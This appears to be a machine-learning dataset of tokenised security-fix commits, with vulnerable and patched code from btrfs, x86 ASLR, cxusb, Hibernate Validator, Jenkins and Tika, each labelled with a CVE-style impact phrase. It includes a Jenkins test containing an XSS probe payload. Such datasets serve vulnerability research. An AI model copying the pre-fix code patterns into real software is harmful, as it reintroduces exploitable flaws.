{"contents": ["btrfs:", "relocation:", "Only", "remove", "reloc", "rb_trees", "if", "reloc", "control", "has", "been", "initialized", "Invalid", "reloc", "tree", "can", "cause", "kernel", "NULL", "pointer", "dereference", "when", "btrfs", "does", "some", "cleanup", "of", "the", "reloc", "roots.", "It", "turns", "out", "that", "fs_info::reloc_ctl", "can", "be", "NULL", "in", "btrfs_recover_relocation()", "as", "we", "allocate", "relocation", "control", "after", "all", "reloc", "roots", "have", "been", "verified.", "So", "when", "we", "hit:", "note,", "we", "haven't", "called", "set_reloc_control()", "thus", "fs_info::reloc_ctl", "is", "still", "NULL.", "Link:", "https://bugzilla.kernel.org/show_bug.cgi?id=199833", "Reported-by:", "Xu", "Wen", "<wen.xu@gatech.edu>", "Signed-off-by:", "Qu", "Wenruo", "<wqu@suse.com>", "Tested-by:", "Gu", "Jinxiang", "<gujx@cn.fujitsu.com>", "Reviewed-by:", "David", "Sterba", "<dsterba@suse.com>", "Signed-off-by:", "David", "Sterba", "<dsterba@suse.com>"], "code_tokens": ["if", "(", "rc", ")", "{", "spin_lock", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "lock", ")", ";", "rb_node", "=", "tree_search", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "rb_root", ",", "root", "-", ">", "node", "-", ">", "start", ")", ";", "if", "(", "rb_node", ")", "{", "node", "=", "rb_entry", "(", "rb_node", ",", "struct", "mapping_node", ",", "rb_node", ")", ";", "rb_erase", "(", "&", "node", "-", ">", "rb_node", ",", "&", "rc", "-", ">", "reloc_root_tree", ".", "rb_root", ")", ";", "}", "spin_unlock", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "lock", ")", ";", "if", "(", "!", "node", ")", "return", ";", "BUG_ON", "(", "(", "struct", "btrfs_root", "*", ")", "node", "-", ">", "data", "!", "=", "root", ")", ";</s>spin_lock", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "lock", ")", ";", "rb_node", "=", "tree_search", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "rb_root", ",", "root", "-", ">", "node", "-", ">", "start", ")", ";", "if", "(", "rb_node", ")", "{", "node", "=", "rb_entry", "(", "rb_node", ",", "struct", "mapping_node", ",", "rb_node", ")", ";", "rb_erase", "(", "&", "node", "-", ">", "rb_node", ",", "&", "rc", "-", ">", "reloc_root_tree", ".", "rb_root", ")", ";", "spin_unlock", "(", "&", "rc", "-", ">", "reloc_root_tree", ".", "lock", ")", ";", "if", "(", "!", "node", ")", "return", ";", "BUG_ON", "(", "(", "struct", "btrfs_root", "*", ")", "node", "-", ">", "data", "!", "=", "root", ")", ";"], "docstring_tokens": ["a", "denial", "of", "service", "condition"]}
{"contents": ["prep", "for", "1.22", "rc2", "(cherry", "picked", "from", "commit", "22ff7564f2641ba195f192d7c59e9df4a3a10747)"], "code_tokens": ["LOG", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Contention", "waiting", "for", "a", "DOMParser", ".", "\"", "\"", "Consider", "increasing", "the", "XMLReaderUtils", ".", "POOL_SIZE", "\"", ");", "LOG", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Contention", "waiting", "for", "a", "DOMParser", ".", "\"", "\"", "Consider", "increasing", "the", "XMLReaderUtils", ".", "POOL_SIZE", "\"", ");", "/", "/", "need", "to", "get", "new", "SAXParser", "because", "/", "/", "an", "attachment", "might", "require", "another", "SAXParser", "/", "/", "mid", "-", "parse", "XMLReaderUtils", ".", "getSAXParser", "(", ").", "parse", "(", "new", "Word2006MLDocHandler", "(", "xhtml", ",", "metadata", ",", "context", ")", "))", ");", "xhtml", ".", "endDocument", "(", ");", "/", "/", "need", "to", "get", "new", "SAXParser", "because", "/", "/", "an", "attachment", "might", "require", "another", "SAXParser", "/", "/", "mid", "-", "parse", "XMLReaderUtils", ".", "getSAXParser", "(", ").", "parse", "(", "getContentHandler", "(", "tagged", ",", "metadata", ",", "context", ")", "))", ");", "import", "org", ".", "apache", ".", "tika", ".", "sax", ".", "OfflineContentHandler", ";", "XMLReaderUtils", ".", "parseSAX", "(", "is", ",", "new", "OfflineContentHandler", "(", "contentTypeHandler", ")", ",", "new", "ParseContext", "(", "))", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "FileFilter", ";", "import", "org", ".", "apache", ".", "tika", ".", "MultiThreadedTikaTest", ";", "import", "org", ".", "apache", ".", "tika", ".", "exception", ".", "TikaException", ";", "import", "org", ".", "apache", ".", "tika", ".", "parser", ".", "AutoDetectParser", ";", "import", "org", ".", "apache", ".", "tika", ".", "utils", ".", "XMLReaderUtils", ";", "import", "org", ".", "junit", ".", "AfterClass", ";", "public", "class", "Word2006MLParserTest", "extends", "MultiThreadedTikaTest", "{", "@", "AfterClass", "public", "static", "void", "tearDown", "(", ")", "throws", "TikaException", "{", "XMLReaderUtils", ".", "setPoolSize", "(", "XMLReaderUtils", ".", "DEFAULT_POOL_SIZE", ")", ";", "}", "@", "Test", "(", "timeout", "=", "60000", ")", "public", "void", "testMultiThreaded", "(", ")", "throws", "Exception", "{", "XMLReaderUtils", ".", "setPoolSize", "(", "4", ")", ";", "int", "numThreads", "=", "XMLReaderUtils", ".", "getPoolSize", "(", ")*", "2", ";", "ParseContext", "[", "]", "contexts", "=", "new", "ParseContext", "[", "numThreads", "]", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "contexts", ".", "length", ";", "i", "+", "+)", "{", "contexts", "[", "i", "]", "=", "new", "ParseContext", "(", ");", "}", "testMultiThreaded", "(", "new", "AutoDetectParser", "(", "),", "contexts", ",", "numThreads", ",", "2", ",", "new", "FileFilter", "(", ")", "{", "@", "Override", "public", "boolean", "accept", "(", "File", "pathname", ")", "{", "if", "(", "pathname", ".", "getName", "(", ").", "equals", "(", "\"", "testWORD_2006ml", ".", "xml", "\"", "))", "{", "return", "true", ";", "}", "return", "false", ";", "}", "}", ");", "}", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "FileFilter", ";", "import", "org", ".", "apache", ".", "tika", ".", "MultiThreadedTikaTest", ";", "import", "org", ".", "apache", ".", "tika", ".", "exception", ".", "TikaException", ";", "import", "org", ".", "apache", ".", "tika", ".", "parser", ".", "ParseContext", ";", "import", "org", ".", "apache", ".", "tika", ".", "utils", ".", "XMLReaderUtils", ";", "import", "org", ".", "junit", ".", "AfterClass", ";", "public", "class", "XML2003ParserTest", "extends", "MultiThreadedTikaTest", "{", "@", "AfterClass", "public", "static", "void", "tearDown", "(", ")", "throws", "TikaException", "{", "XMLReaderUtils", ".", "setPoolSize", "(", "XMLReaderUtils", ".", "DEFAULT_POOL_SIZE", ")", ";", "}", "@", "Test", "(", "timeout", "=", "60000", ")", "public", "void", "testMultiThreaded", "(", ")", "throws", "Exception", "{", "XMLReaderUtils", ".", "setPoolSize", "(", "4", ")", ";", "int", "numThreads", "=", "XMLReaderUtils", ".", "getPoolSize", "(", ")*", "2", ";", "ParseContext", "[", "]", "contexts", "=", "new", "ParseContext", "[", "numThreads", "]", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "contexts", ".", "length", ";", "i", "+", "+)", "{", "contexts", "[", "i", "]", "=", "new", "ParseContext", "(", ");", "}", "testMultiThreaded", "(", "new", "AutoDetectParser", "(", "),", "contexts", ",", "numThreads", ",", "2", ",", "new", "FileFilter", "(", ")", "{", "@", "Override", "public", "boolean", "accept", "(", "File", "pathname", ")", "{", "if", "(", "pathname", ".", "getName", "(", ").", "equals", "(", "\"", "testWORD2003", ".", "xml", "\"", "))", "{", "return", "true", ";", "}", "return", "false", ";", "}", "}", ");", "}</s>XMLReaderUtils", ".", "parseSAX", "(", "new", "Word2006MLDocHandler", "(", "xhtml", ",", "metadata", ",", "context", ")", "))", ",", "context", ")", ";", "xhtml", ".", "endDocument", "(", ");", "XMLReaderUtils", ".", "parseSAX", "(", "getContentHandler", "(", "tagged", ",", "metadata", ",", "context", ")", "))", ",", "context", ")", ";", "XMLReaderUtils", ".", "parseSAX", "(", "is", ",", "contentTypeHandler", ",", "new", "ParseContext", "(", "))", ";", "public", "class", "Word2006MLParserTest", "extends", "TikaTest", "{", "public", "class", "XML2003ParserTest", "extends", "TikaTest", "{"], "docstring_tokens": ["a", "denial", "of", "service", "condition"]}
{"contents": ["x86,", "mm/ASLR:", "Fix", "stack", "randomization", "on", "64-bit", "systems", "The", "issue", "is", "that", "the", "stack", "for", "processes", "is", "not", "properly", "randomized", "on", "64", "bit", "architectures", "due", "to", "an", "integer", "overflow.", "The", "affected", "function", "is", "randomize_stack_top()", "in", "file", "\"fs/binfmt_elf.c\":", "static", "unsigned", "long", "randomize_stack_top(unsigned", "long", "stack_top)", "{", "unsigned", "int", "random_variable", "=", "0;", "if", "((current->flags", "&", "PF_RANDOMIZE)", "&&", "!(current->personality", "&", "ADDR_NO_RANDOMIZE))", "{", "random_variable", "=", "get_random_int()", "&", "STACK_RND_MASK;", "random_variable", "<<=", "PAGE_SHIFT;", "}", "return", "PAGE_ALIGN(stack_top)", "+", "random_variable;", "return", "PAGE_ALIGN(stack_top)", "-", "random_variable;", "}", "Note", "that,", "it", "declares", "the", "\"random_variable\"", "variable", "as", "\"unsigned", "int\".", "Since", "the", "result", "of", "the", "shifting", "operation", "between", "STACK_RND_MASK", "(which", "is", "0x3fffff", "on", "x86_64,", "22", "bits)", "and", "PAGE_SHIFT", "(which", "is", "12", "on", "x86_64):", "random_variable", "<<=", "PAGE_SHIFT;", "then", "the", "two", "leftmost", "bits", "are", "dropped", "when", "storing", "the", "result", "in", "the", "\"random_variable\".", "This", "variable", "shall", "be", "at", "least", "34", "bits", "long", "to", "hold", "the", "(22+12)", "result.", "These", "two", "dropped", "bits", "have", "an", "impact", "on", "the", "entropy", "of", "process", "stack.", "Concretely,", "the", "total", "stack", "entropy", "is", "reduced", "by", "four:", "from", "2^28", "to", "2^30", "(One", "fourth", "of", "expected", "entropy).", "This", "patch", "restores", "back", "the", "entropy", "by", "correcting", "the", "types", "involved", "in", "the", "operations", "in", "the", "functions", "randomize_stack_top()", "and", "stack_maxrandom_size().", "The", "successful", "fix", "can", "be", "tested", "with:", "$", "for", "i", "in", "`seq", "1", "10`;", "do", "cat", "/proc/self/maps", "|", "grep", "stack;", "done", "7ffeda566000-7ffeda587000", "rw-p", "00000000", "00:00", "0", "[stack]", "7fff5a332000-7fff5a353000", "rw-p", "00000000", "00:00", "0", "[stack]", "7ffcdb7a1000-7ffcdb7c2000", "rw-p", "00000000", "00:00", "0", "[stack]", "7ffd5e2c4000-7ffd5e2e5000", "rw-p", "00000000", "00:00", "0", "[stack]", "...", "Once", "corrected,", "the", "leading", "bytes", "should", "be", "between", "7ffc", "and", "7fff,", "rather", "than", "always", "being", "7fff.", "Signed-off-by:", "Hector", "Marco-Gisbert", "<hecmargi@upv.es>", "Signed-off-by:", "Ismael", "Ripoll", "<iripoll@upv.es>", "[", "Rebased,", "fixed", "80", "char", "bugs,", "cleaned", "up", "commit", "message,", "added", "test", "example", "and", "CVE", "]", "Signed-off-by:", "Kees", "Cook", "<keescook@chromium.org>", "Cc:", "<stable@vger.kernel.org>", "Cc:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>", "Cc:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Cc:", "Al", "Viro", "<viro@zeniv.linux.org.uk>", "Fixes:", "Link:", "http://lkml.kernel.org/r/20150214173350.GA18393@www.outflux.net", "Signed-off-by:", "Borislav", "Petkov", "<bp@suse.de>"], "code_tokens": ["static", "unsigned", "long", "stack_maxrandom_size", "(", "void", ")", "unsigned", "long", "max", "=", "0", ";", "max", "=", "(", "(-", "1UL", ")", "&", "STACK_RND_MASK", ")", "<", "<", "PAGE_SHIFT", ";", "unsigned", "long", "random_variable", "=", "0", ";", "random_variable", "=", "(", "unsigned", "long", ")", "get_random_int", "(", ");", "random_variable", "&", "=", "STACK_RND_MASK", ";</s>static", "unsigned", "int", "stack_maxrandom_size", "(", "void", ")", "unsigned", "int", "max", "=", "0", ";", "max", "=", "(", "(-", "1U", ")", "&", "STACK_RND_MASK", ")", "<", "<", "PAGE_SHIFT", ";", "unsigned", "int", "random_variable", "=", "0", ";", "random_variable", "=", "get_random_int", "(", ")", "&", "STACK_RND_MASK", ";"], "docstring_tokens": ["execute", "arbitrary", "code", "on", "the", "system"]}
{"contents": ["HV-1498", "Fix", "privilege", "escalation", "when", "running", "under", "the", "security", "manager"], "code_tokens": ["permission", "org", ".", "hibernate", ".", "validator", ".", "HibernateValidatorPermission", "\"", "accessPrivateMembers", "\"", ";", "/", "*", "*", "Hibernate", "Validator", ",", "declare", "and", "validate", "application", "constraints", "*", "*", "License", ":", "Apache", "License", ",", "Version", "2", ".", "0", "*", "See", "the", "license", ".", "txt", "file", "in", "the", "root", "directory", "or", "<", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", ">", ".", "*", "/", "package", "org", ".", "hibernate", ".", "validator", ";", "import", "java", ".", "security", ".", "BasicPermission", ";", "/", "**", "*", "Our", "specific", "implementation", "of", "{", "@", "link", "BasicPermission", "}", "as", "we", "cannot", "define", "additional", "{", "@", "link", "RuntimePermission", "}", ".", "*", "<", "p", ">", "*", "{", "@", "code", "HibernateValidatorPermission", "}", "is", "thread", "-", "safe", "and", "immutable", ".", "*", "*", "@", "author", "Guillaume", "Smet", "*", "/", "public", "class", "HibernateValidatorPermission", "extends", "BasicPermission", "{", "public", "static", "final", "HibernateValidatorPermission", "ACCESS_PRIVATE_MEMBERS", "=", "new", "HibernateValidatorPermission", "(", "\"", "accessPrivateMembers", "\"", ")", ";", "public", "HibernateValidatorPermission", "(", "String", "name", ")", "{", "super", "(", "name", ")", ";", "}", "public", "HibernateValidatorPermission", "(", "String", "name", ",", "String", "actions", ")", "{", "super", "(", "name", ",", "actions", ")", ";", "}", "}", "@", "@", "-", "40", ",", "6", "+", "40", ",", "7", "@", "@", "import", "org", ".", "hibernate", ".", "validator", ".", "HibernateValidatorPermission", ";", "SecurityManager", "sm", "=", "System", ".", "getSecurityManager", "(", ");", "if", "(", "sm", "!", "=", "null", ")", "{", "sm", ".", "checkPermission", "(", "HibernateValidatorPermission", ".", "ACCESS_PRIVATE_MEMBERS", ")", ";", "}", "import", "org", ".", "hibernate", ".", "validator", ".", "HibernateValidatorPermission", ";", "SecurityManager", "sm", "=", "System", ".", "getSecurityManager", "(", ");", "if", "(", "sm", "!", "=", "null", ")", "{", "sm", ".", "checkPermission", "(", "HibernateValidatorPermission", ".", "ACCESS_PRIVATE_MEMBERS", ")", ";", "}", "permission", "org", ".", "hibernate", ".", "validator", ".", "HibernateValidatorPermission", "\"", "accessPrivateMembers", "\"", ";", "permission", "org", ".", "hibernate", ".", "validator", ".", "HibernateValidatorPermission", "\"", "accessPrivateMembers", "\"", ";", "permission", "org", ".", "hibernate", ".", "validator", ".", "HibernateValidatorPermission", "\"", "accessPrivateMembers", "\"", ";</s>field", ".", "setAccessible", "(", "true", ")", ";"], "docstring_tokens": ["gain", "elevated", "privileges", "and", "validate", "an", "invalid", "instance"]}
{"contents": ["[media]", "cxusb:", "Use", "a", "dma", "capable", "buffer", "also", "for", "reading", "Commit", "17ce039b4e54", "(\"[media]", "cxusb:", "don't", "do", "DMA", "on", "stack\")", "added", "a", "kmalloc'ed", "bounce", "buffer", "for", "writes,", "but", "missed", "to", "do", "the", "same", "for", "reads.", "As", "the", "read", "only", "happens", "after", "the", "write", "is", "finished,", "we", "can", "reuse", "the", "same", "buffer.", "As", "dvb_usb_generic_rw", "handles", "a", "read", "length", "of", "0", "by", "itself,", "avoid", "calling", "it", "using", "the", "dvb_usb_generic_read", "wrapper", "function.", "Signed-off-by:", "Stefan", "Br\u00fcns", "<stefan.bruens@rwth-aachen.de>", "Signed-off-by:", "Mauro", "Carvalho", "Chehab", "<mchehab@s-opensource.com>"], "code_tokens": ["int", "ret", ";", "if", "(", "rlen", ">", "MAX_XFER_SIZE", ")", "{", "warn", "(", "\"", "i2c", "rd", ":", "len", "=", "%", "d", "is", "too", "big", "!", "\\", "n", "\"", ",", "rlen", ")", ";", "return", "-", "EOPNOTSUPP", ";", "}", "ret", "=", "dvb_usb_generic_rw", "(", "d", ",", "st", "-", ">", "data", ",", "1", "+", "wlen", ",", "st", "-", ">", "data", ",", "rlen", ",", "0", ")", ";", "if", "(", "!", "ret", "&", "&", "rbuf", "&", "&", "rlen", ")", "memcpy", "(", "rbuf", ",", "st", "-", ">", "data", ",", "rlen", ")", ";</s>int", "ret", ",", "wo", ";", "wo", "=", "(", "rbuf", "=", "=", "NULL", "|", "|", "rlen", "=", "=", "0", ")", ";", "/", "*", "write", "-", "only", "*", "/", "if", "(", "wo", ")", "ret", "=", "dvb_usb_generic_write", "(", "d", ",", "st", "-", ">", "data", ",", "1", "+", "wlen", ")", ";", "else", "ret", "=", "dvb_usb_generic_rw", "(", "d", ",", "st", "-", ">", "data", ",", "1", "+", "wlen", ",", "rbuf", ",", "rlen", ",", "0", ")", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(system", "crash", ")", "or", "possibly", "have", "unspecified", "other", "impact"]}
{"contents": ["[FIXED", "SECURITY-715]", "Guard", "credential", "enumeration", "with", "permission", "check.", "Previously,", "users", "who", "were", "not", "allowed", "to", "read", "credentials,", "or", "job", "configs,", "could", "list", "the", "available", "Google", "OAuth", "credentials", "in", "the", "system,", "and", "validate", "whether", "the", "credentials", "were", "valid."], "code_tokens": ["import", "com", ".", "google", ".", "jenkins", ".", "plugins", ".", "credentials", ".", "oauth", ".", "GoogleRobotCredentials", ";", "import", "hudson", ".", "model", ".", "Item", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "AncestorInPath", ";", "import", "static", "hudson", ".", "model", ".", "Item", ".", "EXTENDED_READ", ";", "public", "ListBoxModel", "doFillGoogleCredentialsIdItems", "(", "@", "AncestorInPath", "Item", "item", ")", "{", "/", "/", "Only", "allow", "enumerating", "credentials", "if", "we", "have", "the", "appropriate", "permission", "if", "(", "item", "=", "=", "null", "|", "|", "!", "item", ".", "hasPermission", "(", "EXTENDED_READ", ")", ")", "{", "return", "new", "ListBoxModel", "(", ");", "}", "ListBoxModel", "credentials", "=", "GoogleRobotCredentials", ".", "getCredentialsListBox", "(", "GooglePlayPublisher", ".", "class", ")", ";", "public", "FormValidation", "doCheckGoogleCredentialsId", "(", "@", "AncestorInPath", "Item", "item", ",", "@", "QueryParameter", "String", "value", ")", "{", "/", "/", "Only", "allow", "validating", "the", "existence", "of", "credentials", "if", "we", "have", "the", "appropriate", "permission", "if", "(", "item", "=", "=", "null", "|", "|", "!", "item", ".", "hasPermission", "(", "EXTENDED_READ", ")", ")", "{", "return", "FormValidation", ".", "ok", "(", ");", "}", "ListBoxModel", "credentials", "=", "GoogleRobotCredentials", ".", "getCredentialsListBox", "(", "GooglePlayPublisher", ".", "class", ")", ";</s>import", "static", "com", ".", "google", ".", "jenkins", ".", "plugins", ".", "credentials", ".", "oauth", ".", "GoogleRobotCredentials", ".", "getCredentialsListBox", ";", "public", "ListBoxModel", "doFillGoogleCredentialsIdItems", "(", ")", "{", "ListBoxModel", "credentials", "=", "getCredentialsListBox", "(", "GooglePlayPublisher", ".", "class", ")", ";", "public", "FormValidation", "doCheckGoogleCredentialsId", "(", "@", "QueryParameter", "String", "value", ")", "{", "ListBoxModel", "credentials", "=", "getCredentialsListBox", "(", "GooglePlayPublisher", ".", "class", ")", ";"], "docstring_tokens": ["perform", "the", "following", "actions"]}
{"contents": ["[SECURITY-1901]"], "code_tokens": ["$", "{%", "started_by_project", "(", "app", ".", "getItemByFullName", "(", "it", ".", "upstreamProject", ")", ".", "fullDisplayName", ",", "it", ".", "upstreamBuild", ".", "toString", "(", "),", "it", ".", "upstreamUrl", ",", "rootURL", ")", "}", "$", "{%", "started_by_project_with_deleted_build", "(", "app", ".", "getItemByFullName", "(", "it", ".", "upstreamProject", ")", ".", "fullDisplayName", ",", "it", ".", "upstreamBuild", ".", "toString", "(", "),", "it", ".", "upstreamUrl", ",", "rootURL", ")", "}", "$", "{", "it", ".", "shortDescription", "}", "<", "br", "/", ">$", "{%", "caused_by", "}", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2020", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "model", ";", "import", "hudson", ".", "tasks", ".", "BuildTrigger", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Issue", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "TestExtension", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "concurrent", ".", "atomic", ".", "AtomicBoolean", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertFalse", ";", "public", "class", "UpstreamCauseSEC1901Test", "{", "@", "Rule", "public", "JenkinsRule", "j", "=", "new", "JenkinsRule", "(", ");", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "1901", "\"", ")", "public", "void", "preventXssInUpstreamDisplayName", "(", ")", "throws", "Exception", "{", "j", ".", "jenkins", ".", "setQuietPeriod", "(", "0", ")", ";", "FreeStyleProject", "up", "=", "j", ".", "createFreeStyleProject", "(", "\"", "up", "\"", ");", "up", ".", "setDisplayName", "(", "\"", "Up", "<", "script", ">", "alert", "(", "123", ")", "</", "script", ">", "Project", "\"", ");", "FreeStyleProject", "down", "=", "j", ".", "createFreeStyleProject", "(", "\"", "down", "\"", ");", "up", ".", "getPublishersList", "(", ").", "add", "(", "new", "BuildTrigger", "(", "down", ".", "getFullName", "(", "),", "false", ")", ");", "j", ".", "jenkins", ".", "rebuildDependencyGraph", "(", ");", "j", ".", "buildAndAssertSuccess", "(", "up", ")", ";", "FreeStyleBuild", "downBuild", "=", "this", ".", "waitForDownBuild", "(", "down", ")", ";", "ensureXssIsPrevented", "(", "downBuild", ")", ";", "}", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "1901", "\"", ")", "public", "void", "preventXssInUpstreamDisplayName_deleted", "(", ")", "throws", "Exception", "{", "j", ".", "jenkins", ".", "setQuietPeriod", "(", "0", ")", ";", "FreeStyleProject", "up", "=", "j", ".", "createFreeStyleProject", "(", "\"", "up", "\"", ");", "up", ".", "setDisplayName", "(", "\"", "Up", "<", "script", ">", "alert", "(", "123", ")", "</", "script", ">", "Project", "\"", ");", "FreeStyleProject", "down", "=", "j", ".", "createFreeStyleProject", "(", "\"", "down", "\"", ");", "up", ".", "getPublishersList", "(", ").", "add", "(", "new", "BuildTrigger", "(", "down", ".", "getFullName", "(", "),", "false", ")", ");", "j", ".", "jenkins", ".", "rebuildDependencyGraph", "(", ");", "FreeStyleBuild", "upBuild", "=", "j", ".", "buildAndAssertSuccess", "(", "up", ")", ";", "FreeStyleBuild", "downBuild", "=", "this", ".", "waitForDownBuild", "(", "down", ")", ";", "/", "/", "that", "will", "display", "a", "different", "part", "upBuild", ".", "delete", "(", ");", "ensureXssIsPrevented", "(", "downBuild", ")", ";", "}", "@", "Test", "@", "Issue", "(", "\"", "SECURITY", "-", "1901", "\"", ")", "public", "void", "preventXssInUpstreamShortDescription", "(", ")", "throws", "Exception", "{", "FullNameChangingProject", "up", "=", "j", ".", "createProject", "(", "FullNameChangingProject", ".", "class", ",", "\"", "up", "\"", ");", "FreeStyleProject", "down", "=", "j", ".", "createFreeStyleProject", "(", "\"", "down", "\"", ");", "CustomBuild", "upBuild", "=", "j", ".", "buildAndAssertSuccess", "(", "up", ")", ";", "up", ".", "setVirtualName", "(", "\"", "Up", "<", "script", ">", "alert", "(", "123", ")", "</", "script", ">", "Project", "\"", ");", "j", ".", "assertBuildStatusSuccess", "(", "down", ".", "scheduleBuild2", "(", "0", ",", "new", "Cause", ".", "UpstreamCause", "(", "upBuild", ")", "))", ";", "up", ".", "setVirtualName", "(", "null", ")", ";", "FreeStyleBuild", "downBuild", "=", "this", ".", "waitForDownBuild", "(", "down", ")", ";", "ensureXssIsPrevented", "(", "downBuild", ")", ";", "}", "private", "void", "ensureXssIsPrevented", "(", "FreeStyleBuild", "downBuild", ")", "throws", "Exception", "{", "AtomicBoolean", "alertCalled", "=", "new", "AtomicBoolean", "(", "false", ")", ";", "JenkinsRule", ".", "WebClient", "wc", "=", "j", ".", "createWebClient", "(", ");", "wc", ".", "setAlertHandler", "(", "(", "page", ",", "s", ")", "-", ">", "alertCalled", ".", "set", "(", "true", ")", ");", "wc", ".", "goTo", "(", "downBuild", ".", "getUrl", "(", "))", ";", "assertFalse", "(", "\"", "XSS", "not", "prevented", "\"", ",", "alertCalled", ".", "get", "(", "))", ";", "}", "private", "<", "B", "extends", "Build", "<", "?,", "B", ">", ">", "B", "waitForDownBuild", "(", "Project", "<", "?,", "B", ">", "down", ")", "throws", "Exception", "{", "j", ".", "waitUntilNoActivity", "(", ");", "B", "result", "=", "down", ".", "getBuilds", "(", ").", "getLastBuild", "(", ");", "return", "result", ";", "}", "public", "static", "class", "CustomBuild", "extends", "Build", "<", "FullNameChangingProject", ",", "CustomBuild", ">", "{", "public", "CustomBuild", "(", "FullNameChangingProject", "job", ")", "throws", "IOException", "{", "super", "(", "job", ")", ";", "}", "}", "static", "class", "FullNameChangingProject", "extends", "Project", "<", "FullNameChangingProject", ",", "CustomBuild", ">", "implements", "TopLevelItem", "{", "private", "volatile", "String", "virtualName", ";", "public", "FullNameChangingProject", "(", "ItemGroup", "parent", ",", "String", "name", ")", "{", "super", "(", "parent", ",", "name", ")", ";", "}", "public", "void", "setVirtualName", "(", "String", "virtualName", ")", "{", "this", ".", "virtualName", "=", "virtualName", ";", "}", "@", "Override", "public", "String", "getName", "(", ")", "{", "if", "(", "virtualName", "!", "=", "null", ")", "{", "return", "virtualName", ";", "}", "else", "{", "return", "super", ".", "getName", "(", ");", "}", "}", "@", "Override", "protected", "Class", "<", "CustomBuild", ">", "getBuildClass", "(", ")", "{", "return", "CustomBuild", ".", "class", ";", "}", "@", "Override", "public", "TopLevelItemDescriptor", "getDescriptor", "(", ")", "{", "return", "(", "FreeStyleProject", ".", "DescriptorImpl", ")", "Jenkins", ".", "get", "(", ").", "getDescriptorOrDie", "(", "getClass", "(", "))", ";", "}", "@", "TestExtension", "public", "static", "class", "DescriptorImpl", "extends", "AbstractProjectDescriptor", "{", "@", "Override", "public", "FullNameChangingProject", "newInstance", "(", "ItemGroup", "parent", ",", "String", "name", ")", "{", "return", "new", "FullNameChangingProject", "(", "parent", ",", "name", ")", ";", "}", "}", "}", "}</s><", "j", ":", "out", "value", "=", "\"$", "{%", "started_by_project", "(", "app", ".", "getItemByFullName", "(", "it", ".", "upstreamProject", ")", ".", "fullDisplayName", ",", "it", ".", "upstreamBuild", ".", "toString", "(", "),", "it", ".", "upstreamUrl", ",", "rootURL", ")", "}\"", "/>", "<", "j", ":", "out", "value", "=", "\"$", "{%", "started_by_project_with_deleted_build", "(", "app", ".", "getItemByFullName", "(", "it", ".", "upstreamProject", ")", ".", "fullDisplayName", ",", "it", ".", "upstreamBuild", ".", "toString", "(", "),", "it", ".", "upstreamUrl", ",", "rootURL", ")", "}\"", "/>", "<", "j", ":", "out", "value", "=", "\"$", "{", "it", ".", "shortDescription", "}", "\"/", ">", "<", "br", "/", "><", "j", ":", "out", "value", "=", "\"$", "{%", "caused_by", "}", "\"", "/", ">"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
